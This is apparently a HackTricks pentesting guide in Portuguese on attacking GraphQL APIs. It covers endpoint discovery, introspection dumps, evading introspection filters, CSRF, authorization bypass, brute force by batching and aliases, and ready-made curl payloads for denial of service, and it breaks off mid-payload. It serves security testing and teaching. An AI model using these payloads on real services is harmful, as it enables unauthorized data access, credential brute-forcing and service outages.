# GraphQL

{{#include ../../banners/hacktricks-training.md}}

## Introduction

GraphQL é destacado como uma alternativa eficiente ao REST API, oferecendo uma abordagem simplificada para consultar dados do back-end. Em contraste com o REST, que frequentemente exige numerosas requisições em vários endpoints para coletar dados, o GraphQL permite recuperar todas as informações necessárias por meio de uma **única requisição**. Essa simplificação beneficia significativamente os desenvolvedores ao reduzir a complexidade dos seus processos de obtenção de dados.

## GraphQL and Security

Com o surgimento de novas tecnologias, incluindo o GraphQL, também aparecem novas vulnerabilidades de segurança. Um ponto importante a notar é que o GraphQL **não inclui mecanismos de autenticação por padrão**. É responsabilidade dos desenvolvedores implementar tais medidas de segurança. Sem autenticação adequada, endpoints GraphQL podem expor informações sensíveis para usuários não autenticados, representando um risco de segurança significativo.

### Directory Brute Force Attacks and GraphQL

Para identificar instâncias GraphQL expostas, recomenda-se incluir caminhos específicos em ataques de brute force de diretório. Esses caminhos são:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Identificar instâncias GraphQL abertas permite examinar as queries suportadas. Isso é crucial para entender os dados acessíveis através do endpoint. O sistema de introspecção do GraphQL facilita isso ao detalhar as queries que um schema suporta. Para mais informações sobre isso, consulte a documentação do GraphQL sobre introspecção: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

A ferramenta [**graphw00f**](https://github.com/dolevf/graphw00f) é capaz de detectar qual engine GraphQL está sendo usada em um servidor e então imprime algumas informações úteis para o auditor de segurança.

#### Universal queries <a href="#universal-queries" id="universal-queries"></a>

Para verificar se uma URL é um serviço GraphQL, pode-se enviar uma **universal query**, `query{__typename}`. Se a resposta incluir `{"data": {"__typename": "Query"}}`, isso confirma que a URL hospeda um endpoint GraphQL. Esse método depende do campo `__typename` do GraphQL, que revela o tipo do objeto consultado.
```javascript
query{__typename}
```
### Enumeração Básica

Graphql geralmente suporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Embora, por segurança, seja recomendado permitir apenas json para prevenir CSRF attacks.

#### Introspecção

Para usar a introspecção para descobrir informações do schema, faça uma query no campo `__schema`. Este campo está disponível no tipo raiz (root type) de todas as queries.
```bash
query={__schema{types{name,fields{name}}}}
```
Com esta query você encontrará o nome de todos os types que estão sendo usados:

![](<../../images/image (1036).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
Com esta query você pode extrair todos os types, seus fields e seus arguments (e o type dos args). Isso será muito útil para saber como consultar o database.

![](<../../images/image (950).png>)

**Erros**

É interessante saber se os **erros** serão **exibidos**, pois contribuirão com **informações** úteis.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../images/image (416).png>)

**Enumerar o Esquema do Banco de Dados via Introspection**

> [!TIP]
> Se a introspection estiver habilitada, mas a query acima não for executada, tente remover as diretivas `onOperation`, `onFragment`, e `onField` da estrutura da query.
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Consulta de introspecção inline:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
A última linha de código é uma query graphql que irá extrair todas as meta-informações do graphql (nomes de objetos, parâmetros, tipos...)

![](<../../images/image (363).png>)

Se a introspecção estiver habilitada você pode usar [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) para ver em uma interface gráfica todas as opções.

### Consultas

Agora que sabemos que tipo de informação é armazenada no banco de dados, vamos tentar **extrair alguns valores**.

Na introspecção você pode encontrar **qual objeto você pode consultar diretamente** (porque você não pode consultar um objeto só porque ele existe). Na imagem a seguir você pode ver que o "_queryType_" se chama "_Query_" e que um dos campos do objeto "_Query_" é "_flags_", que também é um tipo de objeto. Portanto você pode consultar o objeto "_flags_".

![](<../../images/Screenshot from 2021-03-13 18-17-48.png>)

Note que o tipo da query "_flags_" é "_Flags_", e esse objeto é definido como abaixo:

![](<../../images/Screenshot from 2021-03-13 18-22-57 (1).png>)

Você pode ver que os objetos "_Flags_" são compostos por **name** e **value**. Então você pode obter todos os nomes e valores das flags com a query:
```javascript
query={flags{name, value}}
```
Observe que, no caso em que o **object to query** é um **primitive** **type** como **string**, como no exemplo abaixo

![](<../../images/image (958).png>)

Você pode simplesmente consultá-lo com:
```javascript
query = { hiddenFlags }
```
Em outro exemplo onde havia 2 objetos dentro do tipo de objeto "_Query_": "_user_" e "_users_".\
Se esses objetos não precisarem de nenhum argumento para pesquisar, poderia **recuperar todas as informações deles** apenas **pedindo** os dados que você quer. Neste exemplo da Internet você poderia extrair os usernames e passwords salvos:

![](<../../images/image (880).png>)

No entanto, neste exemplo se você tentar fazer isso você recebe este **erro**:

![](<../../images/image (1042).png>)

Parece que de alguma forma ele vai pesquisar usando o argumento "_**uid**_" do tipo _**Int**_.\
De qualquer forma, já sabíamos disso; na seção [Basic Enumeration](graphql.md#basic-enumeration) uma query foi proposta que nos mostrou todas as informações necessárias: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se você ler a imagem fornecida quando executei essa query verá que "_**user**_" tinha o **arg** "_**uid**_" do tipo _Int_.

Então, realizando um leve bruteforce de _**uid**_ encontrei que em _**uid**=**1**_ um username e uma password foram recuperados:\
`query={user(uid:1){user,password}}`

![](<../../images/image (90).png>)

Observe que eu **descobri** que poderia pedir os **parâmetros** "_**user**_" e "_**password**_" porque se eu tentar buscar algo que não existe (`query={user(uid:1){noExists}}`) eu recebo este erro:

![](<../../images/image (707).png>)

E durante a **enumeration phase** descobri que o objeto "_**dbuser**_" tinha como fields "_**user**_" e "_**password**_.

**Query string dump trick (thanks to @BinaryShadow\_)**

If you can search by a string type, like: `query={theusers(description: ""){username,password}}` and you **search for an empty string** it will **dump all data**. (_Note this example isn't related with the example of the tutorials, for this example suppose you can search using "**theusers**" by a String field called "**description**"_).

### Pesquisando

Nesta configuração, uma **database** contém **persons** e **movies**. **Persons** são identificadas pelo seu **email** e **name**; **movies** pelo seu **name** e **rating**. **Persons** podem ser friends entre si e também ter movies, indicando relacionamentos dentro da database.

Você pode **pesquisar** persons **por** o **name** e obter seus emails:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Você pode **buscar** pessoas **pelo** **nome** e obter seus **filmes** **assinados**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Observe como é indicado recuperar o `name` dos `subscribedMovies` da pessoa.

Você também pode **pesquisar vários objetos ao mesmo tempo**. Neste caso, é feita a busca de 2 filmes:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ou até **relações de vários objetos diferentes usando aliases**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutações

**Mutações são usadas para fazer alterações no lado do servidor.**

Na **introspection** você pode encontrar as **mutações** **declaradas**. Na imagem a seguir o "_MutationType_" é chamado "_Mutation_" e o objeto "_Mutation_" contém os nomes das mutações (como "_addPerson_" neste caso):

![](<../../images/Screenshot from 2021-03-13 18-26-27 (1).png>)

Nesta configuração, um **banco de dados** contém **pessoas** e **filmes**. **Pessoas** são identificadas pelo **email** e **name**; **filmes** pelo **name** e **rating**. **Pessoas** podem ser amigas entre si e também ter filmes, indicando relacionamentos dentro do banco de dados.

Uma mutação para **criar novos** filmes dentro do banco de dados pode ser a seguinte (neste exemplo a mutação é chamada `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Observe como tanto os valores quanto o tipo de dados são indicados na query.**

Além disso, o banco de dados suporta uma operação **mutation**, chamada `addPerson`, que permite a criação de **persons** juntamente com suas associações a **friends** e **movies** existentes. É crucial notar que os **friends** e **movies** devem pré-existir no banco de dados antes de vinculá-los à person recém-criada.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Directive Overloading

Como explicado em [**one of the vulns described in this report**](https://www.landh.tech/blog/20240304-google-hack-50000/), um directive overloading implica chamar um directive milhões de vezes para fazer o servidor desperdiçar operações até que seja possível causar um DoS.

### Batching brute-force in 1 API request

This information was take from [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Authentication through GraphQL API with **simultaneously sending many queries with different credentials** to check it. It’s a classic brute force attack, but now it’s possible to send more than one login/password pair per HTTP request because of the GraphQL batching feature. This approach would trick external rate monitoring applications into thinking all is well and there is no brute-forcing bot trying to guess passwords.

Below you can find the simplest demonstration of an application authentication request, with **3 different email/passwords pairs at a time**. Obviously it’s possible to send thousands in a single request in the same way:

![](<../../images/image (1081).png>)

As we can see from the response screenshot, the first and the third requests returned _null_ and reflected the corresponding information in the _error_ section. The **second mutation had the correct authentication** data and the response has the correct authentication session token.

![](<../../images/image (119) (1).png>)

## GraphQL Sem Introspecção

More and more **graphql endpoints are disabling introspection**. However, the errors that graphql throws when an unexpected request is received are enough for tools like [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) to recreate most part of the schema.

Moreover, the Burp Suite extension [**GraphQuail**](https://github.com/forcesunseen/graphquail) extension **observes GraphQL API requests going through Burp** and **builds** an internal GraphQL **schema** with each new query it sees. It can also expose the schema for GraphiQL and Voyager. The extension returns a fake response when it receives an introspection query. As a result, GraphQuail shows all queries, arguments, and fields available for use within the API. For more info [**check this**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

A nice **wordlist** to discover [**GraphQL entities can be found here**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Bypassing GraphQL introspection defences <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

To bypass restrictions on introspection queries in APIs, inserting a **special character after the `__schema` keyword** proves effective. This method exploits common developer oversights in regex patterns that aim to block introspection by focusing on the `__schema` keyword. By adding characters like **spaces, new lines, and commas**, which GraphQL ignores but might not be accounted for in regex, restrictions can be circumvented. For instance, an introspection query with a newline after `__schema` may bypass such defenses:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se não tiver sucesso, considere métodos de requisição alternativos, como **GET requests** ou **POST with `x-www-form-urlencoded`**, já que restrições podem se aplicar apenas a requisições POST.

### Tente WebSockets

Como mencionado em [**this talk**](https://www.youtube.com/watch?v=tIo_t5uUK50), verifique se é possível conectar-se ao graphQL via WebSockets, pois isso pode permitir contornar um possível WAF e fazer com que a comunicação websocket leak o esquema do graphQL:
```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`,
}

var graphqlMsg = {
type: "GQL.START",
id: "1",
payload: GQL_CALL,
}
ws.send(JSON.stringify(graphqlMsg))
}
```
### **Descobrindo Estruturas GraphQL Expostas**

Quando a introspecção está desativada, examinar o código-fonte do site em busca de consultas pré-carregadas em bibliotecas JavaScript é uma estratégia útil. Essas consultas podem ser encontradas usando a aba `Sources` nas ferramentas de desenvolvedor, fornecendo insights sobre o schema da API e revelando potencialmente **consultas sensíveis expostas**. Os comandos para buscar nas ferramentas de desenvolvedor são:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
### Error-based schema reconstruction & engine fingerprinting (InQL v6.1+)

Quando a introspecção está bloqueada, **InQL v6.1+** pode agora reconstruir o esquema alcançável puramente a partir do feedback de erros. The new *schema bruteforcer* agrupa nomes candidatos de field/argument a partir de uma wordlist configurável e os envia em operações multi-field para reduzir o chatter HTTP. Padrões de erro úteis são então coletados automaticamente:

- `Field 'bugs' not found on type 'inql'` confirma a existência do tipo pai enquanto descarta nomes de campos inválidos.
- `Argument 'contribution' is required` indica que um argumento é obrigatório e revela sua grafia.
- Indicações de sugestão como `Did you mean 'openPR'?` são reinseridas na fila como candidatos validados.
- Ao enviar intencionalmente valores com o primitivo errado (por ex., inteiros onde se esperam strings) o bruteforcer provoca erros de incompatibilidade de tipo que leak a assinatura real do tipo, incluindo wrappers de lista/objeto como `[Episode!]`.

O bruteforcer continua recursando sobre qualquer tipo que produza novos campos, então uma wordlist que misture nomes genéricos de GraphQL com palpites específicos da aplicação acabará mapeando grandes partes do esquema sem introspection. O tempo de execução é limitado principalmente por rate limiting e volume de candidatos, portanto ajustar finamente as configurações do InQL (wordlist, batch size, throttling, retries) é crítico para envolvimentos mais stealthy.

No mesmo release, o InQL traz um **GraphQL engine fingerprinter** (emprestando assinaturas de ferramentas como `graphw00f`). O módulo envia diretivas/queries deliberadamente inválidas e classifica o backend ao casar o texto exato do erro. Por exemplo:
```graphql
query @deprecated {
__typename
}
```
- Apollo responde com `Directive "@deprecated" may not be used on QUERY.`
- GraphQL Ruby responde `'@deprecated' can't be applied to queries`.

Uma vez que um motor é reconhecido, o InQL exibe a entrada correspondente da [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix), ajudando testadores a priorizar fraquezas presentes nessa família de servidores (comportamento padrão de introspecção, limites de profundidade, lacunas de CSRF, envio de arquivos, etc.).

Por fim, **geração automática de variáveis** remove um bloqueador clássico ao pivotar para o Burp Repeater/Intruder. Sempre que uma operação requerer um JSON de variáveis, o InQL agora injeta valores padrão sensatos para que a requisição passe na validação do schema no primeiro envio:
```text
"String"  -> "exampleString"
"Int"     -> 42
"Float"   -> 3.14
"Boolean" -> true
"ID"      -> "123"
ENUM      -> first declared value
```
Objetos de input aninhados herdam o mesmo mapping, então você obtém imediatamente um payload sintaticamente e semanticamente válido que pode ser fuzzed para SQLi/NoSQLi/SSRF/logic bypasses sem precisar fazer reverse-engineering manual de cada argumento.

## CSRF em GraphQL

Se você não sabe o que é CSRF, leia a página a seguir:


{{#ref}}
../../pentesting-web/csrf-cross-site-request-forgery.md
{{#endref}}

Lá você vai encontrar vários endpoints GraphQL **configurados sem CSRF tokens.**

Observe que requisições GraphQL normalmente são enviadas via POST usando o Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
No entanto, a maioria dos endpoints GraphQL também suporta **`form-urlencoded` POST requests:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Portanto, como requisições CSRF como as anteriores são enviadas **without preflight requests**, é possível **perform** **changes** no GraphQL abusando do CSRF.

No entanto, note que o novo valor padrão do cookie para a flag `samesite` do Chrome é `Lax`. Isso significa que o cookie será enviado por um site de terceiros apenas em requisições GET.

Observe que geralmente é possível enviar a **query** **request** também como uma **GET** **request** e que o token CSRF pode não ser validado em uma requisição GET.

Além disso, abusar de um [**XS-Search**](../../pentesting-web/xs-search/index.html) **attack** pode possibilitar exfiltrar conteúdo do endpoint GraphQL utilizando as credenciais do usuário.

Para mais informações, veja o [**original post here**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Cross-site WebSocket hijacking in GraphQL

Semelhante às vulnerabilidades CRSF que abusam do GraphQL, também é possível realizar um **Cross-site WebSocket hijacking to abuse an authentication with GraphQL with unprotected cookies** e fazer com que um usuário execute ações inesperadas no GraphQL.

For more information check:


{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}

## Autorização no GraphQL

Muitas funções GraphQL definidas no endpoint podem verificar apenas a autenticação do solicitante, mas não a autorização.

Modificar variáveis de entrada da query pode levar ao [leaked](https://hackerone.com/reports/792927) de detalhes sensíveis da conta.

Uma Mutation pode até resultar em account takeover ao tentar modificar dados de outras contas.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Contornar autorização no GraphQL

[Chaining queries](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) together can bypass a weak authentication system.

No exemplo abaixo você pode ver que a operação é "forgotPassword" e que ela deveria executar apenas a query forgotPassword associada a ela. Isso pode ser contornado adicionando uma query ao final — neste caso adicionamos "register" e uma variável user para o sistema registrar como um novo usuário.

<figure><img src="../../images/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Contornando Rate Limits usando aliases no GraphQL

In GraphQL, aliases are a powerful feature that allow for the **naming of properties explicitly** when making an API request. This capability is particularly useful for retrieving **multiple instances of the same type** of object within a single request. Aliases can be employed to overcome the limitation that prevents GraphQL objects from having multiple properties with the same name.

Para uma compreensão detalhada de GraphQL aliases, o recurso a seguir é recomendado: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Embora o propósito principal de aliases seja reduzir a necessidade de várias chamadas API, foi identificado um caso de uso não intencional onde aliases podem ser aproveitados para executar ataques brute force em um endpoint GraphQL. Isso é possível porque alguns endpoints são protegidos por rate limiters projetados para impedir ataques brute force restringindo o **número de requisições HTTP**. Contudo, esses rate limiters podem não levar em conta o número de operações dentro de cada requisição. Como aliases permitem a inclusão de múltiplas queries em uma única requisição HTTP, eles podem contornar tais medidas de rate limiting.

Considere o exemplo fornecido abaixo, que ilustra como queries com aliases podem ser usadas para verificar a validade de códigos de desconto da loja. Esse método pode contornar o rate limiting já que compila várias queries em uma única requisição HTTP, potencialmente permitindo a verificação de numerosos códigos de desconto simultaneamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## DoS in GraphQL

### Alias Overloading

**Alias Overloading** é uma vulnerabilidade do GraphQL em que atacantes sobrecarregam uma query com muitos aliases para o mesmo campo, fazendo com que o resolver do backend execute esse campo repetidamente. Isso pode sobrecarregar os recursos do servidor, levando a um **Denial of Service (DoS)**. Por exemplo, na query abaixo, o mesmo campo (`expensiveField`) é solicitado 1,000 vezes usando aliases, forçando o backend a computá‑lo 1,000 vezes, potencialmente esgotando CPU ou memória:
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
```
Para mitigar isso, implemente alias count limits, query complexity analysis, or rate limiting para evitar abuso de recursos.

### **Array-based Query Batching**

**Array-based Query Batching** é uma vulnerabilidade onde uma API GraphQL permite batching de múltiplas queries em uma única requisição, permitindo que um atacante envie um grande número de queries simultaneamente. Isso pode sobrecarregar o backend ao executar todas as queries agrupadas em paralelo, consumindo recursos excessivos (CPU, memória, conexões de banco de dados) e potencialmente levando a um **Denial of Service (DoS)**. Se não existir um limite no número de queries em um batch, um atacante pode explorar isso para degradar a disponibilidade do serviço.
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```
Neste exemplo, 10 consultas diferentes são agrupadas em uma única requisição, forçando o servidor a executar todas simultaneamente. Se explorado com um tamanho de lote maior ou consultas computacionalmente caras, isso pode sobrecarregar o servidor.

### **Vulnerabilidade de Directive Overloading**

**Directive Overloading** ocorre quando um servidor GraphQL permite consultas com diretivas excessivas e duplicadas. Isso pode sobrecarregar o analisador e o executor do servidor, especialmente se o servidor processar repetidamente a mesma lógica de diretiva. Sem validação adequada ou limites, um atacante pode explorar isso elaborando uma consulta com numerosas diretivas duplicadas para provocar alto uso computacional ou de memória, levando a **Denial of Service (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Observe que no exemplo anterior `@aa` é uma diretiva customizada que **pode não estar declarada**. Uma diretiva comum que geralmente existe é **`@include`**:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Você também pode enviar uma consulta de introspecção para descobrir todas as diretivas declaradas:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```
E então **use alguns dos personalizados** ones.

### **Field Duplication Vulnerability**

**Field Duplication** é uma vulnerabilidade em que um servidor GraphQL permite consultas com o mesmo campo repetido excessivamente. Isso força o servidor a resolver o campo de forma redundante para cada instância, consumindo recursos significativos (CPU, memória e chamadas ao banco de dados). Um atacante pode elaborar consultas com centenas ou milhares de campos repetidos, causando alta carga e potencialmente levando a um Denial of Service (DoS).
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename 